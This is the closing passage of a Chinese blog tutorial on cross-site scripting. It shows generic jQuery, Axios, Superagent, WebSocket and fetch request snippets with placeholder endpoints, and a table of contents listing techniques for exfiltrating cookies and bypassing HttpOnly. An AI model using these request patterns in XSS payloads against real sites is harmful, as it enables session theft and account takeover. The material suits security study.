+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">  <span class="attr">url</span>: <span class="string">&#x27;YOUR_ENDPOINT_HERE&#x27;</span>,</span><br><span class="line">  <span class="attr">method</span>: <span class="string">&#x27;GET&#x27;</span>, <span class="comment">// 或者 &#x27;POST&#x27;, &#x27;PUT&#x27;, &#x27;DELETE&#x27;, 等。</span></span><br><span class="line">  <span class="attr">success</span>: <span class="keyword">function</span>(<span class="params">data</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(data);</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">error</span>: <span class="keyword">function</span>(<span class="params">error</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Request Failed:&#x27;</span>, error);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>Axios</li>
+</ol>
+<p>Axios不是原生支持的，需要引入。你可以通过CDN添加Axios：</p>
+<p>html</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>使用Axios发送请求：</p>
+<p>javascript</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">axios.<span class="title function_">get</span>(<span class="string">&#x27;YOUR_ENDPOINT_HERE&#x27;</span>)</span><br><span class="line">  .<span class="title function_">then</span>(<span class="keyword">function</span> (<span class="params">response</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(response.<span class="property">data</span>);</span><br><span class="line">  &#125;)</span><br><span class="line">  .<span class="title function_">catch</span>(<span class="keyword">function</span> (<span class="params">error</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Request Failed:&#x27;</span>, error);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>Superagent</li>
+</ol>
+<p>Superagent也需要引入。通过CDN添加Superagent：</p>
+<p>html</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdnjs.cloudflare.com/ajax/libs/superagent/6.1.0/superagent.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>使用Superagent发送请求：</p>
+<p>javascript</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">superagent</span><br><span class="line">  .<span class="title function_">get</span>(<span class="string">&#x27;YOUR_ENDPOINT_HERE&#x27;</span>)</span><br><span class="line">  .<span class="title function_">end</span>(<span class="function">(<span class="params">err, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123; <span class="keyword">return</span> <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Request Failed:&#x27;</span>, err); &#125;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res.<span class="property">body</span>);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>
+
+<ol start="4">
+<li>WebSocket</li>
+</ol>
+<p>WebSocket是HTML5的一部分，不需要额外引入。但WebSocket用于实现双向通信，不同于常规的HTTP请求。以下是一个简单的WebSocket示例：</p>
+<p>javascript</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> socket = <span class="keyword">new</span> <span class="title class_">WebSocket</span>(<span class="string">&#x27;wss://YOUR_WEBSOCKET_ENDPOINT_HERE&#x27;</span>);</span><br><span class="line"></span><br><span class="line">socket.<span class="property">onopen</span> = <span class="keyword">function</span>(<span class="params">event</span>) &#123;</span><br><span class="line">  socket.<span class="title function_">send</span>(<span class="string">&#x27;Hello Server!&#x27;</span>); <span class="comment">// 发送数据到服务器</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">socket.<span class="property">onmessage</span> = <span class="keyword">function</span>(<span class="params">event</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Message from server &#x27;</span>, event.<span class="property">data</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<ol start="5">
+<li>Fetch API</li>
+</ol>
+<p>Fetch API是现代浏览器原生支持的，不需要引入任何额外的库：</p>
+<p>javascript</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;YOUR_ENDPOINT_HERE&#x27;</span>)</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> response.<span class="title function_">json</span>()) <span class="comment">// 假设服务器返回的是JSON数据</span></span><br><span class="line">  .<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(data))</span><br><span class="line">  .<span class="title function_">catch</span>(<span class="function"><span class="params">error</span> =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Request Failed:&#x27;</span>, error));</span><br></pre></td></tr></table></figure>
+
+<p>请替换 <code>&#39;YOUR_ENDPOINT_HERE&#39;</code> 和 <code>&#39;wss://YOUR_WEBSOCKET_ENDPOINT_HERE&#39;</code> 为你实际的请求URL或WebSocket端点。每种方法都有其特定的使用场景和优势，选择合适的根据你的项目需求而定。</p>
+</article>
+<div class="article-footer">
+    <section id="references">
+      <div class="header"><span>参考资料</span></div>
+      <div class="body">
+        <ul>
+        <li class="post-title">
+          <p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12370">对于XSS跨站脚本攻击的学习  - 先知社区</a></p>
+
+        </li>
+        
+        <li class="post-title">
+          <p><a target="_blank" rel="noopener" href="https://book.hacktricks.wiki/zh/pentesting-web/hacking-with-cookies/index.html#httponly">Cookies Hacking - HackTricks</a></p>
+
+        </li>
+        </ul>
+      </div>
+    </section>
+    
+    <section id="license">
+      <div class="header"><span>许可协议</span></div>
+      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div>
+    </section>
+    
+
+
+    <section id="share">
+      <div class="header"><span>分享文章</span></div>
+      <div class="body">
+        <div class="link"><input class="copy-area" readonly="true" id="copy-link" value="https://wells.host/posts/fe1aa8c3/" /></div>
+        <div class="social-wrap dis-select"><a class="social share-item wechat" onclick="util.toggle(&quot;qrcode-wechat&quot;)"><img  src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/b32ef3da1162a.svg" /></a><a class="social share-item weibo" target="_blank" rel="external nofollow noopener noreferrer" href="https://service.weibo.com/share/share.php?url=https://wells.host/posts/fe1aa8c3/&title=XSS - Wells's Blog&summary=XSS简介动态站点会受到一种名为“跨站脚本攻击”（Cross Site Scripting，缩写成XSS）的威胁，恶意攻击者会在 Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，..."><img  src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/80c07e4dbb303.svg" /></a><a class="social share-item email" href="mailto:?subject=XSS - Wells's Blog&amp;body=https://wells.host/posts/fe1aa8c3/"><img  src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/a1b00e20f425d.svg" /></a><a class="social share-item link" onclick="util.copy(&quot;copy-link&quot;, &quot;复制成功&quot;)"><img  src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/8411ed322ced6.svg" /></a></div>
+        
+        <div class="qrcode" id="qrcode-wechat" style="opacity:0;height:0">
+          <img src="https://api.qrserver.com/v1/create-qr-code/?size=256x256&data=https://wells.host/posts/fe1aa8c3/"/>
+        </div>
+        
+      </div>
+    </section>
+    </div>
+
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/posts/931c692/">文件上传漏洞</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/posts/b1f1aefc/">常见协议与PHP伪协议</a></div></section></div>
+
+
+
+
+  <div class="related-wrap md-text" id="comments">
+    <section class='header cmt-title cap theme'>
+      <p>快来参与讨论吧~</p>
+
+    </section>
+    <section class='body cmt-body beaudar'>
+      
+
+<svg class="loading" style="vertical-align:middle;fill:currentColor;overflow:hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg>
+
+<div id="beaudar" repo="we11s/blog-comment" issue-term="pathname" theme="preferred-color-scheme" input-position="top" comment-order="desc" loading="true" branch="main"></div>
+
+    </section>
+  </div>
+
+
+
+<footer class="page-footer footnote"><hr><div class="text"><p>本站由 <a href="/">Wells</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.33.1">Stellar</a> 主题创建。<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+</div></footer>
+<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
+<div class="widgets">
+
+
+
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS%E7%AE%80%E4%BB%8B"><span class="toc-text">XSS简介</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS%E7%9A%84%E5%88%86%E7%B1%BB%EF%BC%9A"><span class="toc-text">XSS的分类：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E5%8F%8D%E5%B0%84%E5%9E%8B-%E9%9D%9E%E6%8C%81%E4%B9%85%E5%8C%96"><span class="toc-text">1、反射型(非持久化)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E5%AD%98%E5%82%A8%E5%9E%8B-%E6%8C%81%E4%B9%85%E5%8C%96"><span class="toc-text">2、存储型(持久化)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81DOM-based%E5%9E%8B"><span class="toc-text">3、DOM-based型</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS%E4%BB%A3%E7%A0%81%E6%8F%92%E5%85%A5%E4%BD%8D%E7%BD%AE"><span class="toc-text">XSS代码插入位置</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%8F%92%E5%85%A5%E5%88%B0HTML%E6%B3%A8%E9%87%8A%E5%86%85%E5%AE%B9%E4%B8%AD"><span class="toc-text">1.插入到HTML注释内容中</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%8F%92%E5%85%A5%E5%88%B0HTML%E6%A0%87%E7%AD%BE%E7%9A%84%E5%B1%9E%E6%80%A7%E5%80%BC%E4%B8%AD"><span class="toc-text">2.插入到HTML标签的属性值中</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%8F%92%E5%85%A5%E5%88%B0HTML%E6%A0%87%E7%AD%BE%E7%9A%84%E5%B1%9E%E6%80%A7%E5%90%8D%E4%B8%AD"><span class="toc-text">3.插入到HTML标签的属性名中</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E6%8F%92%E5%85%A5%E5%88%B0HTML%E6%A0%87%E7%AD%BE%E5%90%8D%E4%B8%AD"><span class="toc-text">4.插入到HTML标签名中</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E6%8F%92%E5%85%A5%E5%88%B0CSS%E4%B8%AD"><span class="toc-text">6.插入到CSS中</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E6%8F%92%E5%85%A5%E5%88%B0HTTP%E5%93%8D%E5%BA%94%E4%B8%AD"><span class="toc-text">7.插入到HTTP响应中</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C%E8%84%9A%E6%9C%AC%E7%9A%84%E6%A0%87%E7%AD%BE%E4%BB%A5%E5%8F%8A%E5%AF%B9%E5%BA%94%E5%B1%9E%E6%80%A7"><span class="toc-text">运行脚本的标签以及对应属性</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%87%E7%AD%BE"><span class="toc-text">&lt;img&gt;标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%87%E7%AD%BE-1"><span class="toc-text">&lt;iframe&gt;标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%87%E7%AD%BE-2"><span class="toc-text">&lt;audio&gt; 标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%87%E7%AD%BE-3"><span class="toc-text">&lt;video&gt;标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%87%E7%AD%BE-4"><span class="toc-text">&lt;svg&gt; 标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%87%E7%AD%BE-5"><span class="toc-text">&lt;button&gt; 标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%87%E7%AD%BE-6"><span class="toc-text">&lt;div&gt;标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%87%E7%AD%BE-7"><span class="toc-text">&lt;object&gt;标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%87%E7%AD%BE-8"><span class="toc-text">&lt;script&gt; 标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%87%E7%AD%BE-9"><span class="toc-text">&lt;p&gt; 标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%87%E7%AD%BE-10"><span class="toc-text">&lt;input&gt; 标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%87%E7%AD%BE-11"><span class="toc-text">&lt;details&gt;标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%87%E7%AD%BE-12"><span class="toc-text">&lt;select&gt; 标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%87%E7%AD%BE-13"><span class="toc-text">&lt;form&gt; 标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%87%E7%AD%BE-14"><span class="toc-text">&lt;body&gt; 标签</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A4%96%E5%B8%A6COOKIE"><span class="toc-text">外带COOKIE</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96cookie"><span class="toc-text">获取cookie</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AA%E8%AE%BE%E7%BD%AE%E4%B8%BAHttpOnly"><span class="toc-text">未设置为HttpOnly</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%EF%BC%9Adocument-cookie"><span class="toc-text">方法：document.cookie</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%BE%E7%BD%AE%E4%B8%BAHttpOnly"><span class="toc-text">设置为HttpOnly</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9Acookie%E5%9B%9E%E6%98%BE%E9%A1%B5%E9%9D%A2"><span class="toc-text">方法一：cookie回显页面</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9ATRACE-HTTP"><span class="toc-text">方法二：TRACE HTTP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%89%EF%BC%9A-Cookie-Jar-%E6%BA%A2%E5%87%BA"><span class="toc-text">方法三： Cookie Jar 溢出</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E5%9B%9B%EF%BC%9A%E8%A1%A8%E5%8D%95%E5%8A%AB%E6%8C%81"><span class="toc-text">方法四：表单劫持</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%94%EF%BC%9A%E6%B5%8F%E8%A7%88%E5%99%A8%E6%BC%8F%E6%B4%9E%E3%80%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E"><span class="toc-text">方法五：浏览器漏洞、中间件漏洞</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%A6%E5%87%BAcookie"><span class="toc-text">带出cookie</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#fetch-%E6%96%B9%E6%B3%95"><span class="toc-text">fetch()方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XMLHttpRequest-%E5%AF%B9%E8%B1%A1"><span class="toc-text">XMLHttpRequest 对象</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#window-location-%E5%AF%B9%E8%B1%A1"><span class="toc-text">window.location 对象</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#window-open%E6%96%B9%E6%B3%95"><span class="toc-text">window.open方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#document-write%E6%96%B9%E6%B3%95"><span class="toc-text">document.write方法</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%99%84%EF%BC%9A%E5%B8%A6src%E5%B1%9E%E6%80%A7%E7%9A%84%E6%A0%87%E7%AD%BE"><span class="toc-text">附：带src属性的标签</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9B%B4%E5%A4%9A%E6%AD%A3%E5%9C%A8%E5%AD%A6%E4%B9%A0%E4%B8%AD%E2%80%A6"><span class="toc-text">更多正在学习中…..</span></a></li></ol></li></ol></li></ol></li></ol></div><div class="widget-footer"><a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Solar by 480 Design - https://creativecommons.org/licenses/by/4.0/ --><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5"><path stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/><path d="M7 3.338A9.95 9.95 0 0 1 12 2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12c0-1.821.487-3.53 1.338-5"/></g></svg><span>回到顶部</span></a><a class="buttom" onclick="util.scrollComment()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Solar by 480 Design - https://creativecommons.org/licenses/by/4.0/ --><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5" d="M8 10.5h8M8 14h5.5M17 3.338A9.95 9.95 0 0 0 12 2C6.477 2 2 6.477 2 12c0 1.6.376 3.112 1.043 4.453c.178.356.237.763.134 1.148l-.595 2.226a1.3 1.3 0 0 0 1.591 1.592l2.226-.596a1.63 1.63 0 0 1 1.149.133A9.96 9.96 0 0 0 12 22c5.523 0 10-4.477 10-10c0-1.821-.487-3.53-1.338-5"/></svg><span>参与讨论</span></a></div></widget>
+</div></aside><div class='float-panel'>
+  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
+  </button>
+  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  </button>
+</div>
+</div><div class="scripts">
+
+
+<script type="text/javascript">
+  window.canonical = {"originalHost":null,"officialHosts":["localhost"],"encoded":""};
+  const ctx = {
+    date_suffix: {
+      just: `刚刚`,
+      min: `分钟前`,
+      hour: `小时前`,
+      day: `天前`,
+    },
+    root : `/`,
+    tag_plugins: {
+      chat: Object.assign({"api":"https://siteinfo.listentothewind.cn/api/v1"}),
+    }
+  };
+
+  // required plugins (only load if needs)
+  if (`local_search`) {
+    ctx.search = {};
+    ctx.search.service = `local_search`;
+    if (ctx.search.service == 'local_search') {
+      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"skip_search":null,"sort":"-date"}`);
+      ctx.search[ctx.search.service] = service_obj;
+    }
+  }
+  const def = {
+    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
+    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
+    loading: `https://api.iconify.design/eos-icons:three-dots-loading.svg?color=%231cd0fd`,
+  };
+  const deps = {
+    jquery: `https://cdn.jsdelivr.net/npm/jquery@3.7.1/dist/jquery.min.js`,
+    marked: `https://cdn.jsdelivr.net/npm/marked@13.0.1/lib/marked.umd.min.js`,
+    lazyload: `/%5Bobject%20Object%5D`
+  }
+  
+
+</script>
+
+<script type="text/javascript">
+  
+  function RunItem() {
+    this.list = []; // 存放回调函数
+    this.start = () => {
+      for (var i = 0; i < this.list.length; i++) {
+        this.list[i].run();
+      }
+    };
+    this.push = (fn, name, setRequestAnimationFrame = true) => {
+      let myfn = fn
+      if (setRequestAnimationFrame) {
+        myfn = () => {
+          utils.requestAnimationFrame(fn)
+        }
+      }
+      var f = new Item(myfn, name);
+      this.list.push(f);
+    };
+    this.remove = (name) => {
+      for (let index = 0; index < this.list.length; index++) {
+        const e = this.list[index];
+        if (e.name == name) {
+          this.list.splice(index, 1);
+        }
+      }
+    }
+    // 构造一个可以run的对象
+    function Item(fn, name) {
+      // 函数名称
+      this.name = name || fn.name;
+      // run方法
+      this.run = () => {
+        try {
+          fn()
+        } catch (error) {
+          console.log(error);
+        }
+      };
+    }
+  }
+
+  const utils = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    css: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    js: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')) {
+        src = ctx.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function () {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    jq: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        utils.js(deps.jquery).then(fn)
+      } else {
+        fn()
+      }
+    },
+
+    onLoading: (el) => {
+      if (el) {
+        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
+      }
+    },
+    onLoadSuccess: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap').remove();
+      }
+    },
+    onLoadFailure: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap svg').remove();
+        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
+        $(el).find('.loading-wrap').addClass('error');
+      }
+    },
+    request: (el, url, callback, onFailure) => {
+      const maxRetry = 3;
+      let retryCount = 0;
+
+      return new Promise((resolve, reject) => {
+        const load = () => {
+          utils.onLoading?.(el);
+
+          let timedOut = false;
+          const timeout = setTimeout(() => {
+            timedOut = true;
+            console.warn('[request] 超时:', url);
+
+            if (++retryCount >= maxRetry) {
+              utils.onLoadFailure?.(el);
+              onFailure?.();
+              reject('请求超时');
+            } else {
+              setTimeout(load, 1000);
+            }
+          }, 5000);
+
+          fetch(url).then(resp => {
+            if (timedOut) return;
+            clearTimeout(timeout);
+
+            if (!resp.ok) throw new Error('响应失败');
+            return resp;
+          }).then(data => {
+            if (timedOut) return;
+            utils.onLoadSuccess?.(el);
+            callback(data);
+            resolve(data);
+          }).catch(err => {
+            clearTimeout(timeout);
+            console.warn('[request] 错误:', err);
+
